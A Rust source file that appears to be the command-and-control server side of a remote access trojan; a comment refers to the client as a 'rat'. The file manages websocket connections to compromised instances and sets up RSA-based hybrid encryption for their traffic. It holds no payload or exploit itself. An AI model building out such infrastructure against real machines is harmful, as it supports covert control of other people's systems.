use core::str;
use std::net::{IpAddr, SocketAddr};

use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use rsa::{
    pkcs1::{DecodeRsaPublicKey, EncodeRsaPublicKey},
    RsaPrivateKey, RsaPublicKey,
};
use tokio_tungstenite::WebSocketStream;
use tungstenite::Message;

use crate::connector_server::utils::hybrid_crypto_util::generate_private_key;

use super::utils::hybrid_crypto_util::{encrypt_data_combined, HybridDecryption};

#[derive(Debug)]
#[allow(dead_code)]
pub struct Instance {
    ip: IpAddr,
    write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
    read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
    hostname: String,
    public_key: Option<RsaPublicKey>,
    private_key: Option<RsaPrivateKey>,
    path: String,
}
impl Instance {
    pub fn new(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key: None,
            private_key: None,
            path,
        }
    }
    pub fn init_old(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        public_key: Option<RsaPublicKey>,
        private_key: Option<RsaPrivateKey>,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key,
            private_key,
            path,
        }
    }
    pub fn get_ip(&self) -> IpAddr {
        self.ip
    }
    pub fn get_hostname(&self) -> &str {
        &self.hostname
    }
    pub fn get_path(&self) -> &str {
        &self.path
    }
    pub fn set_public_key(&mut self, public_key: RsaPublicKey) {
        self.public_key = Some(public_key);
    }
    pub fn get_public_key(&self) -> RsaPublicKey {
        self.public_key.clone().unwrap()
    }
    pub fn set_private_key(&mut self, private_key: RsaPrivateKey) {
        self.private_key = Some(private_key);
    }
    pub async fn send_message(&mut self, message: &str) {
        self.write.send(Message::from(message)).await.unwrap();
    }
    pub async fn send_hybrid_encryption(&mut self, public_key: RsaPublicKey, data_to_enc: Vec<u8>) {
        let hybrid_encryption_result = encrypt_data_combined(public_key, data_to_enc);
        self.send_message(hybrid_encryption_result.get_encrypted_key().as_str())
            .await;
        self.send_message(hybrid_encryption_result.get_nonce().as_str())
            .await;
        self.send_message(hybrid_encryption_result.get_encrypted_data().as_str())
            .await;
    }
    pub async fn accept_message(&mut self) -> Vec<u8> {
        let mut hybrid_decryption_arguments: [Vec<u8>; 3] = [Vec::new(), Vec::new(), Vec::new()];
        for index in 0..3 {
            if let Some(message) = self.read.next().await {
                //cant put hex decode in the decrypt fn cuz it cant accept
                hybrid_decryption_arguments[index] =
                    hex::decode(message.unwrap().to_string()).unwrap();
            }
        }
        let hybrid_decryption = HybridDecryption::new(
            hybrid_decryption_arguments[0].clone(),
            hybrid_decryption_arguments[1].clone(),
            hybrid_decryption_arguments[2].clone(),
        );
        hybrid_decryption.decrypt(self.private_key.clone().unwrap())
    }
    //make it return error
    pub async fn init_keys(&mut self) -> (RsaPublicKey, RsaPrivateKey) {
        //Send pong for rat to generate a public key
        self.send_message("pong").await;

        if let Some(message) = &self.read.next().await {
            let public_key = message.as_ref().unwrap().to_string();
            //Generate private key and also assign it
            let private_key = generate_private_key();
            //Get public key from what user sends us
            self.set_public_key(RsaPublicKey::from_pkcs1_pem(public_key.as_str()).unwrap());
            self.set_private_key(private_key.to_owned());

            //Send my public key encrypted by users public key to user and forget about it

            self.send_hybrid_encryption(
                self.public_key.clone().unwrap(),
                private_key
                    .to_public_key()
                    .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                    .unwrap()
                    .into(),
            )
            .await;
        }
        println!("Rsa init sequence with instance complete");
        (
            self.public_key.clone().unwrap(),
            self.private_key.clone().unwrap(),
        )
    }
}
